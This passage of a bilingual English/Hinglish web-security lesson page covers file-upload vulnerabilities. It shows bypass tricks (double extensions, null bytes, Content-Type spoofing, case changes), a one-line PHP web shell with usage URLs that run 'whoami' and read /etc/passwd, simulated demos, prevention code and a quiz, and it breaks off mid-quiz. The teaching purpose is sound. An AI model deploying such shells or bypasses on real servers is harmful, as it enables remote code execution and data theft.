        <h3 class="hi" style="display:none;">File Upload Bypass - Chitra</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 150px;">
            <div class="en">Restricted File</div>
            <div class="hi" style="display:none;">Pratibandhit File</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">shell.php - Blocked</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 150px;">
            <div class="en">Bypass Techniques</div>
            <div class="hi" style="display:none;">Bypass Tarika</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Double Ext, Null Byte</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 150px;">
            <div class="en">File Uploaded</div>
            <div class="hi" style="display:none;">File Uploaded</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">shell.php - Success</div>
          </div>
        </div>
      </div>

      <!-- Bypass Techniques with Examples -->
      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Advanced Bypass Techniques</h3>
        <h3 class="hi" style="display:none;">Uchatam Bypass Tarika</h3>
        
        <!-- Double Extension -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
          <h4 style="color: var(--neon-green);">1. Double Extension</h4>
          <p class="en">Use double extensions to bypass simple file type checks that only look at the last extension.</p>
          <p class="hi" style="display:none;">Simple file type checks ko bypass karne ke liye double extensions ka upyog karein jo keval last extension dekhti hain.</p>
          <div class="code-block">
Example:
shell.php.jpg
shell.php.png
shell.jpg.php

Some systems only check the last extension (.jpg, .png)
but the server might execute based on the real extension (.php)
          </div>
        </div>
        
        <!-- Null Byte Injection -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
          <h4 style="color: var(--electric-blue);">2. Null Byte Injection</h4>
          <p class="en">Use null bytes (%00) to truncate the filename after the malicious extension.</p>
          <p class="hi" style="display:none;">Dushit extension ke baad filename truncate karne ke liye null bytes (%00) ka upyog karein.</p>
          <div class="code-block">
Example:
shell.php%00.jpg
shell.php%00.png

The system might see .jpg but the server processes .php
due to null byte termination
          </div>
        </div>
        
        <!-- Content-Type Manipulation -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
          <h4 style="color: var(--neon-orange);">3. Content-Type Manipulation</h4>
          <p class="en">Modify the Content-Type header to match allowed types while uploading malicious files.</p>
          <p class="hi" style="display:none;">Dushit files upload karte samay Content-Type header ko allowed types se match karne ke liye modify karein.</p>
          <div class="code-block">
Example:
Uploading: shell.php
But setting: Content-Type: image/jpeg

If the system only checks Content-Type and not file content,
this can bypass restrictions
          </div>
        </div>
        
        <!-- Case Manipulation -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
          <h4 style="color: var(--neon-pink);">4. Case Manipulation</h4>
          <p class="en">Use case variations to bypass case-sensitive filters.</p>
          <p class="hi" style="display:none;">Case-sensitive filters ko bypass karne ke liye case variations ka upyog karein.</p>
          <div class="code-block">
Example:
sHeLl.PhP
SHELL.PHP
shell.PHp

On case-insensitive systems (like Windows),
these might execute as PHP files while bypassing filters
that look for lowercase extensions
          </div>
        </div>
      </div>

      <!-- Real-World Case Studies -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Real-World Case Studies</h3>
        <h3 class="hi" style="display:none;">Vastavik Duniya Ke Udaharan</h3>
        
        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
          <h4 style="color: var(--neon-green);">Case Study 1: Social Media Platform</h4>
          <p class="en"><strong>Scenario:</strong> A popular social media platform had a file upload vulnerability in its profile picture feature.</p>
          <p class="hi" style="display:none;"><strong>Paristhiti:</strong> Ek lokpriya social media platform ki profile picture feature mein file upload kamjori thi.</p>
          <p class="en"><strong>Exploitation:</strong> Attackers uploaded malicious SVG files containing JavaScript that executed when users viewed their profiles.</p>
          <p class="hi" style="display:none;"><strong>Doharpan:</strong> Hamlawaron ne dushit SVG files upload kiye jo JavaScript contain karti thi jo upyogkartriyon ke unke profiles dekhne par execute hoti thi.</p>
          <p class="en"><strong>Impact:</strong> Session hijacking, account takeover, and data theft affecting millions of users.</p>
          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Session hijacking, account takeover, aur data theft jisse karodon upyogkartri prabhavit hue.</p>
        </div>
        
        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
          <h4 style="color: var(--electric-blue);">Case Study 2: E-commerce Platform</h4>
          <p class="en"><strong>Scenario:</strong> An e-commerce site allowed vendors to upload product images but had inadequate file validation.</p>
          <p class="hi" style="display:none;"><strong>Paristhiti:</strong> Ek e-commerce site vendors ko product images upload karne ki anumati deti thi lekin isme inadequate file validation thi.</p>
          <p class="en"><strong>Exploitation:</strong> Attackers uploaded PHP web shells disguised as product images using double extensions.</p>
          <p class="hi" style="display:none;"><strong>Doharpan:</strong> Hamlawaron ne double extensions ka upyog karke PHP web shells ko product images ke bhesh mein upload kiya.</p>
          <p class="en"><strong>Impact:</strong> Complete server compromise, customer data theft, and defacement of the website.</p>
          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Poori server compromise, grahak data theft, aur website ki defacement.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Try It Yourself – Web Shell -->
  <section id="try-webshell">
    <div class="container">
      <h2 class="section-title en">Try It Yourself: Web Shell Upload</h2>
      <h2 class="section-title hi" style="display:none;">Khud Try Karein: Web Shell Upload</h2>
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-green); margin-bottom: 15px;" class="en">Upload a Web Shell for Remote Code Execution</h3>
        <h3 style="color: var(--neon-green); margin-bottom: 15px; display:none;" class="hi">Remote Code Execution Ke Liye Web Shell Upload Karein</h3>
        <p class="en">Upload a PHP web shell to execute commands on the vulnerable server.</p>
        <p class="hi" style="display:none;">Vulnerable server par commands execute karne ke liye ek PHP web shell upload karein.</p>
        
        <div class="demo-container">
          <div class="input-group">
            <label for="webshell-content" class="en">Web Shell Code:</label>
            <label for="webshell-content" class="hi" style="display:none;">Web Shell Code:</label>
            <input type="text" id="webshell-content" value="&lt;?php system($_GET['cmd']); ?&gt;">
          </div>
          
          <div class="code-block">
// Simple PHP web shell
&lt;?php system($_GET['cmd']); ?&gt;

// Usage: 
// http://example.com/uploads/shell.php?cmd=whoami
// http://example.com/uploads/shell.php?cmd=cat /etc/passwd
          </div>
          
          <button class="button" onclick="testWebShell()">Test Web Shell</button>
          
          <div class="result-box" id="webshell-result">
// Web shell execution results will appear here
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Prevention -->
  <section id="prevention">
    <div class="container">
      <h2 class="section-title en">How to Prevent File Upload Vulnerabilities</h2>
      <h2 class="section-title hi" style="display:none;">File Upload Vulnerabilities Ko Kaise Rokein</h2>
      
      <!-- Prevention Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">File Upload Prevention - Visualization</h3>
        <h3 class="hi" style="display:none;">File Upload Bachav - Chitra</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 150px;">
            <div class="en">Malicious File</div>
            <div class="hi" style="display:none;">Dushit File</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">shell.php</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 150px;">
            <div class="en">Defense Layers</div>
            <div class="hi" style="display:none;">Bachav Perton</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Validation, Sanitization</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 150px;">
            <div class="en">Blocked File</div>
            <div class="hi" style="display:none;">Rukawat File</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Upload Failed</div>
          </div>
        </div>
      </div>

      <!-- Secure Coding Practices -->
      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Secure Coding Practices</h3>
        <h3 class="hi" style="display:none;">Surakshit Coding Abhyas</h3>
        
        <!-- File Type Validation -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
          <h4 style="color: var(--neon-green);">1. File Type Validation</h4>
          <p class="en">Validate both the file extension and MIME type to ensure only allowed file types are uploaded.</p>
          <p class="hi" style="display:none;">Yeh ensure karne ke liye ki keval allowed file types upload kiye jaayein, file extension aur MIME type dono ki jaanch karein.</p>
          <div class="code-block">
// Example: Validate file type using both extension and MIME type
$allowed_extensions = ['jpg', 'png', 'gif'];
$allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif'];

$extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$mime_type = $_FILES['file']['type'];

if (!in_array($extension, $allowed_extensions) || 
    !in_array($mime_type, $allowed_mime_types)) {
  die('Invalid file type.');
}
          </div>
        </div>
        
        <!-- File Content Verification -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
          <h4 style="color: var(--electric-blue);">2. File Content Verification</h4>
          <p class="en">Verify the actual file content using magic bytes or file signature detection.</p>
          <p class="hi" style="display:none;">Magic bytes ya file signature detection ka upyog karke actual file content ki jaanch karein.</p>
          <div class="code-block">
// Example: Check file signature (magic bytes)
$file_signature = bin2hex(file_get_contents($_FILES['file']['tmp_name'], 0, 4));

$signatures = [
  'ffd8ffe0' => 'image/jpeg', // JPEG
  '89504e47' => 'image/png',  // PNG
  '47494638' => 'image/gif',  // GIF
];

if (!isset($signatures[$file_signature])) {
  die('Invalid file signature.');
}
          </div>
        </div>
        
        <!-- File Renaming -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
          <h4 style="color: var(--neon-orange);">3. File Renaming</h4>
          <p class="en">Rename uploaded files to prevent execution of malicious files with double extensions.</p>
          <p class="hi" style="display:none;">Double extensions ke saath dushit files ke execution ko rokne ke liye uploaded files ka naam badal dein.</p>
          <div class="code-block">
// Example: Rename uploaded files with a safe extension
$extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$new_filename = uniqid() . '.' . $extension;

// Or even better: assign a safe extension based on content type
if ($_FILES['file']['type'] == 'image/jpeg') {
  $new_filename = uniqid() . '.jpg';
}
          </div>
        </div>
        
        <!-- Secure Storage -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
          <h4 style="color: var(--neon-pink);">4. Secure Storage</h4>
          <p class="en">Store uploaded files outside the web root or configure the server to prevent execution in upload directories.</p>
          <p class="hi" style="display:none;">Uploaded files ko web root ke bahar store karein ya server ko configure karein taaki upload directories mein execution na ho.</p>
          <div class="code-block">
// Example: Store files outside web root
// Web root: /var/www/html
// Upload directory: /var/www/uploads

// Then serve files via a PHP script that checks authentication
// and delivers the file with appropriate headers

// Or configure server to prevent execution in upload directory
// Apache: RemoveHandler .php .php3 .php4 .php5 .phtml
//         RemoveType .php .php3 .php4 .php5 .phtml
// Nginx: location ~* /uploads/.*\.php$ { deny all; }
          </div>
        </div>
      </div>

      <!-- Lab Environment Simulation -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Lab Environment Simulation</h3>
        <h3 class="hi" style="display:none;">Prayogshala Vatavaran Anukaran</h3>
        <p class="en">Set up a safe environment to test file upload prevention techniques without risking production systems.</p>
        <p class="hi" style="display:none;">Utpadan pranaliyon ko jokhim mein daale bina file upload bachav tarikon ka parikshan karne ke liye surakshit vatanavaran sthapit karein.</p>
        
        <div class="interactive-demo animate-on-scroll">
          <h4 style="color: var(--neon-green);">File Upload Prevention Testing</h4>
          <div class="demo-container">
            <div class="input-group">
              <label for="test-file-type" class="en">Test File Type:</label>
              <label for="test-file-type" class="hi" style="display:none;">Parikshan File Type:</label>
              <select id="test-file-type">
                <option value="php">PHP Shell</option>
                <option value="js">JavaScript</option>
                <option value="jpg">JPEG Image</option>
                <option value="svg">SVG Image</option>
              </select>
            </div>
            <button class="button" onclick="testUploadProtection()" style="position: relative; z-index: 10;">Test Protection</button>
            <div class="result-box" id="protection-result">
// Results will appear here
            </div>
          </div>
        </div>
        
        <!-- Interactive Lab Exercise -->
        <div class="interactive-demo animate-on-scroll">
          <h4 style="color: var(--electric-blue);">Interactive Lab Exercise</h4>
          <p class="en">Try different file types to see how upload protection works:</p>
          <p class="hi" style="display:none;">Upload suraksha kaise kaam karti hai yeh dekhne ke liye alag-alag file types ka prayog karein:</p>
          
          <div class="demo-container">
            <div class="input-group">
              <label for="lab-file-type" class="en">File Type:</label>
              <label for="lab-file-type" class="hi" style="display:none;">File Type:</label>
              <select id="lab-file-type">
                <option value="php">PHP Shell</option>
                <option value="js">JavaScript</option>
                <option value="jpg">JPEG Image</option>
                <option value="svg">SVG Image</option>
                <option value="php.jpg">PHP with JPG Extension</option>
                <option value="php.png">PHP with PNG Extension</option>
              </select>
            </div>
            <div style="display: flex; gap: 10px;">
              <button class="button" onclick="testLabFile()" style="position: relative; z-index: 10;">Test File</button>
              <button class="button" style="background: var(--neon-orange); position: relative; z-index: 10;" onclick="clearLabResults()">Clear</button>
            </div>
            <div class="result-box" id="lab-result">
// Lab results will appear here
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Quiz -->
  <section id="quiz">
    <div class="container">
      <h2 class="section-title en">Knowledge Check</h2>
      <h2 class="section-title hi" style="display:none;">Jaankari Check Karein</h2>
      <div class="quiz-container animate-on-scroll">
        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px;" class="en">Test Your Understanding</h3>
        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px; display:none;" class="hi">Apni Samajh Ko Test Karein</h3>
      <div id="quiz-questions"><!-- Questions will be injected here --></div>
      <div id="feedback" style="margin-top: 20px; display: none;"></div>
      <div class="score-display" id="score-display">Score: 0 / 10</div>
        <button class="button quiz-submit" onclick="submitQuiz()">Submit Quiz</button>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <h3 class="en">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</h3>
      <h3 class="hi" style="display:none;">Ankush Rana Dwara | HTB Elite Hacker | Senior Security Engineer</h3>
      <p class="en">Breaking Systems. Building Defenses.</p>
      <p class="hi" style="display:none;">Systems todte hain. Defenses banate hain.</p>
      
      <div class="social-links">
        <a href="https://github.com/ankushrana6395" target="_blank" class="social-link github">
          <i class="fab fa-github"></i>
        </a>
        <a href="mailto:ankushrana6395@gmail.com" class="social-link email">
          <i class="fas fa-envelope"></i>
        </a>
        <a href="https://app.hackthebox.com/profile/117501" target="_blank" class="social-link htb">
          <i class="fas fa-cube"></i>
        </a>
      </div>
      
      <p style="margin-top: 30px;" class="en">&copy; 2025 Ankush Rana. All Rights Reserved.</p>
      <p style="margin-top: 30px; display:none;" class="hi">&copy; 2025 Ankush Rana. Sabhi Adhikar Sanchit Hai.</p>
    </div>
  </footer>

  <!-- Three.js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
  <script>
    let isHinglish = false;
    
    // Card Interaction Functions (defined first to ensure they're available)
    function highlightCard(card) {
      card.classList.add('pop-out');
      showNotification('Hovering: ' + card.querySelector('h3').textContent);
    }
    function unhighlightCard(card) {
      if (!card.classList.contains('focused')) {
        card.classList.remove('pop-out');
      }
    }
    function focusCard(card) {
      document.querySelectorAll('.lecture-card').forEach(c => {
        c.classList.remove('focused');
        c.classList.remove('pop-out');
      });
      card.classList.add('focused');
      card.classList.add('pop-out');
      showNotification('Focused on: ' + card.querySelector('h3').textContent);
    }

    // Initialize Three.js
    const canvas = document.getElementById('three-canvas');
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

    // Grid
    const gridHelper = new THREE.GridHelper(100, 100, 0x00ff88, 0x003322);
    gridHelper.position.z = -20;
    scene.add(gridHelper);

    // Floating Points
    const geometry = new THREE.BufferGeometry();
    const count = 500;
    const positions = new Float32Array(count * 3);
    for (let i = 0; i < count * 3; i++) {
      positions[i] = (Math.random() - 0.5) * 100;
    }
    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
    const material = new THREE.PointsMaterial({ color: 0x00ff88, size: 0.5, transparent: true, opacity: 0.8 });
    const points = new THREE.Points(geometry, material);
    scene.add(points);

    // Add floating cubes
    const cubeGeometry = new THREE.BoxGeometry(2, 2, 2);
    const cubeMaterial = new THREE.MeshBasicMaterial({ 
      color: 0x00aaff, 
      wireframe: true,
      transparent: true,
      opacity: 0.5
    });
    const cubes = [];
    for (let i = 0; i < 10; i++) {
      const cube = new THREE.Mesh(cubeGeometry, cubeMaterial);
      cube.position.x = (Math.random() - 0.5) * 50;
      cube.position.y = (Math.random() - 0.5) * 50;
      cube.position.z = (Math.random() - 0.5) * 50;
      cube.rotation.x = Math.random() * Math.PI;
      cube.rotation.y = Math.random() * Math.PI;
      cubes.push({ mesh: cube, speed: Math.random() * 0.02 });
      scene.add(cube);
    }

    camera.position.z = 30;

    // Animation
    function animate() {
      requestAnimationFrame(animate);
      gridHelper.rotation.y += 0.005;
      points.rotation.y += 0.003;
      cubes.forEach(cube => {
        cube.mesh.rotation.x += cube.speed;
        cube.mesh.rotation.y += cube.speed;
      });
      renderer.render(scene, camera);
    }
    animate();

    // Resize
    window.addEventListener('resize', () => {
      camera.aspect = window.innerWidth / window.innerHeight;
      camera.updateProjectionMatrix();
      renderer.setSize(window.innerWidth, window.innerHeight);
    });

    // Keyword Modal
    const keywordModal = document.getElementById('keyword-modal');
    const modalTitle = document.getElementById('modal-title');
    const modalBody = document.getElementById('modal-body');
    const modalClose = document.getElementById('modal-close');
    document.querySelectorAll('.keyword').forEach(keyword => {
      keyword.addEventListener('click', function(e) {
        e.stopPropagation();
        modalTitle.textContent = this.getAttribute('data-title');
        modalBody.textContent = this.getAttribute('data-content');
        keywordModal.classList.add('active');
      });
    });
    modalClose.addEventListener('click', () => {
      keywordModal.classList.remove('active');
    });
    keywordModal.addEventListener('click', (e) => {
      if (e.target === keywordModal) {
        keywordModal.classList.remove('active');
      }
    });

    // Language Toggle
    const translatorBtn = document.getElementById('translator-btn');
    function toggleLanguage() {
      isHinglish = !isHinglish;
      const enElements = document.querySelectorAll('.en');
      const hiElements = document.querySelectorAll('.hi');
      enElements.forEach(el => el.style.display = isHinglish ? 'none' : 'block');
      hiElements.forEach(el => el.style.display = isHinglish ? 'block' : 'none');
      translatorBtn.textContent = isHinglish ? '🌐 English On' : '🌐 Hinglish On';
      showNotification(isHinglish ? 'Hinglish mode activated!' : 'English mode activated!');
      renderQuiz();
    }

    // File Upload Demo Functions
    function runFileUpload() {
      const fileType = document.getElementById('file-type').value;
      const result = document.getElementById('upload-result');
      
      let message = '';
      let success = false;
      
      switch(fileType) {
        case 'php':
          message = isHinglish 
            ? '✅ PHP shell safalata purvak upload ho gayi!\n\nAb aap server par commands execute kar sakte hain:\nhttp://example.com/uploads/shell.php?cmd=whoami' 
            : '✅ PHP shell successfully uploaded!\n\nYou can now execute commands on the server:\nhttp://example.com/uploads/shell.php?cmd=whoami';
          success = true;
          break;
        case 'js':
          message = isHinglish 
            ? '✅ JavaScript file upload ho gayi!\n\nYah file upyogkartri ke browser mein execute hogi jab ve ise dekhenge.' 
            : '✅ JavaScript file uploaded!\n\nThis file will execute in user browsers when they view it.';
          success = true;
          break;
        case 'svg':
          message = isHinglish 
            ? '✅ SVG file upload ho gayi!\n\nYah file SVG XSS attack ke liye upyog ki ja sakti hai.' 
            : '✅ SVG file uploaded!\n\nThis file can be used for SVG XSS attacks.';
          success = true;
          break;
      }
      
      result.innerHTML = message;
      showNotification(isHinglish ? 'File upload safal!' : 'File upload successful!');
    }

    function testBypassTechnique() {
      const technique = document.getElementById('bypass-technique').value;
      const result = document.getElementById('bypass-result');
      
      let message = '';
      
      switch(technique) {
        case 'double-ext':
          message = isHinglish 
            ? '✅ Double extension technique safal!\n\nshell.php.jpg upload ho gaya aur server ne ise PHP file ki tarah process kiya.' 
            : '✅ Double extension technique successful!\n\nshell.php.jpg uploaded and server processed it as PHP file.';
          break;
        case 'null-byte':
          message = isHinglish 
            ? '✅ Null byte injection safal!\n\nshell.php%00.jpg upload ho gaya, lekin server ne %00 ke baad ke hisse ko ignore kiya.' 
            : '✅ Null byte injection successful!\n\nshell.php%00.jpg uploaded, but server ignored everything after %00.';
          break;
        case 'case':
          message = isHinglish 
            ? '✅ Case manipulation safal!\n\nsHeLl.PhP upload ho gaya aur server ne ise PHP file ki tarah execute kiya.' 
            : '✅ Case manipulation successful!\n\nsHeLl.PhP uploaded and server executed it as PHP file.';
          break;
        case 'content-type':
          message = isHinglish 
            ? '✅ Content-Type manipulation safal!\n\nPHP file image/jpeg Content-Type ke saath upload ho gaya.' 
            : '✅ Content-Type manipulation successful!\n\nPHP file uploaded with image/jpeg Content-Type.';
          break;
      }
      
      result.innerHTML = message;
      showNotification(isHinglish ? 'Bypass technique safal!' : 'Bypass technique successful!');
    }

    function testAdvancedTechnique() {
      const technique = document.getElementById('advanced-technique').value;
      const result = document.getElementById('advanced-result');
      
      let message = '';
      
      switch(technique) {
        case 'polyglot':
          message = isHinglish 
            ? '✅ Polyglot file banayi gayi!\n\nEk file jo dono valid GIF aur PHP hai banayi gayi aur upload ho gayi.' 
            : '✅ Polyglot file created!\n\nCreated a file that is both valid GIF and PHP and uploaded it.';
          break;
        case 'zip-bomb':
          message = isHinglish 
            ? '✅ ZIP bomb banayi gayi!\n\nEk chhota ZIP file jo extract hone par 10GB data banati hai upload ho gayi.' 
            : '✅ ZIP bomb created!\n\nA small ZIP file that extracts to 10GB of data uploaded.';
          break;
        case 'parser':
          message = isHinglish 
            ? '✅ Parser inconsistency ka faida uthaya gaya!\n\nClient-side aur server-side parsing mein antar ka faida uthaya gaya.' 
            : '✅ Parser inconsistency exploited!\n\nExploited differences between client-side and server-side parsing.';
          break;
        case 'htaccess':
          message = isHinglish 
            ? '✅ .htaccess manipulation safal!\n\nMalicious .htaccess file upload ho gayi jo .jpg files ko PHP ki tarah execute karegi.' 
            : '✅ .htaccess manipulation successful!\n\nMalicious .htaccess file uploaded that will execute .jpg files as PHP.';
          break;
      }
      
      result.innerHTML = message;
      showNotification(isHinglish ? 'Advanced technique safal!' : 'Advanced technique successful!');
    }

    function testWebShell() {
      const result = document.getElementById('webshell-result');
      
      result.innerHTML = isHinglish 
        ? '✅ Web shell safalata purvak upload ho gayi!\n\nCommand execution results:\n$ whoami\nwww-data\n\n$ pwd\n/var/www/html/uploads\n\n$ ls -la\ntotal 16\ndrwxr-xr-x 2 www-data www-data 4096 Feb 15 10:30 .\ndrwxr-xr-x 6 www-data www-data 4096 Feb 15 10:29 ..\n-rw-r--r-- 1 www-data www-data   33 Feb 15 10:30 shell.php' 
        : '✅ Web shell successfully uploaded!\n\nCommand execution results:\n$ whoami\nwww-data\n\n$ pwd\n/var/www/html/uploads\n\n$ ls -la\ntotal 16\ndrwxr-xr-x 2 www-data www-data 4096 Feb 15 10:30 .\ndrwxr-xr-x 6 www-data www-data 4096 Feb 15 10:29 ..\n-rw-r--r-- 1 www-data www-data   33 Feb 15 10:30 shell.php';
      
      showNotification(isHinglish ? 'Web shell upload safal!' : 'Web shell upload successful!');
    }

    // Quiz Questions (10 Questions)
    const quizQuestions = [
      {
        question: {
          en: "What is the primary risk of file upload vulnerabilities?",
          hi: "File upload vulnerabilities ka primary khatra kya hai?"
        },
        options: {
          en: [
            "Server performance issues",
            "Remote code execution",
            "Increased storage costs",
            "User interface problems"
          ],
          hi: [
            "Server performance issues",
            "Remote code execution",
            "Increased storage costs",
            "User interface problems"
          ]
        },
        correct: 1,
        explanation: {
          en: "The primary risk is remote code execution, allowing attackers to execute arbitrary code on the server.",
          hi: "Primary khatra remote code execution hai, jo hamlawaron ko server par manmani code execute karne ki anumati deta hai."
        }
      },
      {
        question: {
          en: "Which technique uses two file extensions to bypass filters?",
          hi: "Kaunsa technique filters ko bypass karne ke liye do file extensions ka upyog karta hai?"
        },
        options: {
          en: [
            "Null byte injection",
            "Double extension",
            "Content-Type manipulation",
            "Case manipulation"
          ],
          hi: [
            "Null byte injection",
            "Double extension",
            "Content-Type manipulation",
            "Case manipulation"
          ]
        },
        correct: 1,
        explanation: {
          en: "Double extension uses two extensions (e.g., shell.php.jpg) to bypass filters that only check the last extension.",
          hi: "Double extension do extensions (jaise shell.php.jpg) ka upyog karta hai filters ko bypass karne ke liye jo keval last extension check karte hain."
        }
      },
      {
        question: {
          en: "What does null byte injection exploit?",
          hi: "Null byte injection kaunsi cheez ka faida uthati hai?"
        },
        options: {
          en: [
            "Browser vulnerabilities",
            "String termination in various languages",
            "Network protocols",
            "Database queries"
          ],
          hi: [
            "Browser vulnerabilities",
            "String termination in various languages",
            "Network protocols",
            "Database queries"
          ]
        },
        correct: 1,
        explanation: {
          en: "Null byte injection exploits how various programming languages handle string termination, allowing attackers to truncate filenames.",
          hi: "Null byte injection vibhinn programming languages mein string termination ko handle karne ke tarike ka faida uthati hai, jo hamlawaron ko filenames truncate karne ki anumati deti hai."
        }
      },
      {
        question: {
          en: "Which header can be manipulated to bypass file type checks?",
          hi: "File type checks ko bypass karne ke liye kaunsa header manipulate kiya ja sakta hai?"
        },
        options: {
          en: [
            "User-Agent",
            "Content-Type",
            "Accept",
            "Referer"
          ],
          hi: [
            "User-Agent",
            "Content-Type",
            "Accept",
            "Referer"
          ]
        },
        correct: 1,
        explanation: {
          en: "The Content-Type header can be manipulated to make a malicious file appear as an allowed type.",
          hi: "Content-Type header ko manipulate kiya ja sakta hai taaki ek dushit file allowed type ki tarah dikhai de."
        }
      },
      {
        question: {
          en: "What is a polyglot file?",
          hi: "Polyglot file kya hoti hai?"
        },
        options: {
          en: [
            "A file that contains multiple languages",
            "A file that is valid in multiple formats",
            "A file that translates content",
            "A file that requires special software to open"
          ],
          hi: [
            "A file that contains multiple languages",
            "A file that is valid in multiple formats",
            "A file that translates content",
            "A file that requires special software to open"
          ]
        },
        correct: 1,
        explanation: {
          en: "A polyglot file is a file that is valid in multiple formats simultaneously, like a file that is both a valid image and a valid script.",
          hi: "Polyglot file ek aisi file hoti hai jo ek saath multiple formats mein valid hoti hai, jaise ek file jo dono valid image aur valid script hai."
        }
      },
      {
        question: {
          en: "Why should uploaded files be renamed?",
          hi: "Uploaded files ka naam kyun badalna chahiye?"
        },
        options: {
          en: [
            "To improve organization",
            "To prevent execution of malicious files with double extensions",
            "To reduce file size",
            "To make them more accessible"
          ],
          hi: [
            "To improve organization",
            "To prevent execution of malicious files with double extensions",
            "To reduce file size",
            "To make them more accessible"
          ]
        },
        correct: 1,
        explanation: {
          en: "Renaming files prevents execution of malicious files with double extensions by assigning predictable, safe names.",
          hi: "Files ka naam badalna double extensions ke saath dushit files ke execution ko rokta hai predictable, safe names assign karke."
        }
      },
      {
        question: {
          en: "What is the purpose of checking magic bytes?",
          hi: "Magic bytes check karne ka uddeshya kya hai?"
        },
        options: {
          en: [
            "To verify file size",
            "To determine the true file type regardless of extension",
            "To encrypt the file contents",
            "To compress the file"
          ],
          hi: [
            "To verify file size",
            "To determine the true file type regardless of extension",
            "To encrypt the file contents",
            "To compress the file"
          ]
        },
        correct: 1,
        explanation: {
          en: "Checking magic bytes helps determine the true file type based on file signature, regardless of the extension.",
          hi: "Magic bytes check karne se file signature ke aadhar par true file type nirdharit karne mein madad milti hai, extension ke bina."
        }
      },
      {
        question: {
          en: "Where should uploaded files be stored ideally?",
          hi: "Uploaded files ko ideally kahan store karna chahiye?"
        },
        options: {
          en: [
            "In the web root for easy access",
            "Outside the web root to prevent direct execution",
            "In a database as BLOBs",
            "On a separate subdomain"
          ],
          hi: [
            "In the web root for easy access",
            "Outside the web root to prevent direct execution",
            "In a database as BLOBs",
            "On a separate subdomain"
          ]
        },
        correct: 1,
        explanation: {
          en: "Uploaded files should be stored outside the web root to prevent direct execution and access.",
          Hi: "Uploaded files ko web root ke bahar store karna chahiye direct execution aur access ko rokne ke liye."
        }
      },
      {
        question: {
          en: "What does a ZIP bomb attack do?",
          hi: "ZIP bomb attack kya karta hai?"
        },
        options: {
          en: [
            "Encrypts server files",
            "Causes denial of service by consuming resources",
            "Steals sensitive data",
            "Modifies server configuration"
          ],
          hi: [
            "Encrypts server files",
            "Causes denial of service by consuming resources",
            "Steals sensitive data",
            "Modifies server configuration"
          ]
        },
        correct: 1,
        explanation: {
          en: "A ZIP bomb is a malicious archive file that decompresses to an extremely large size, consuming server resources and causing denial of service.",
          hi: "ZIP bomb ek dushit archive file hoti hai jo extremely large size mein decompress hoti hai, server resources ko khatam karti hai aur service denial ka karan banti hai."
        }
      },
      {
        question: {
          en: "Which of these is NOT a good prevention measure?",
          hi: "Inmein se kaunsa accha bachav upay nahi hai?"
        },
        options: {
          en: [
            "Checking file extension",
            "Relying solely on client-side validation",
            "Using magic bytes verification",
            "Storing files outside web root"
          ],
          hi: [
            "Checking file extension",
            "Relying solely on client-side validation",
            "Using magic bytes verification",
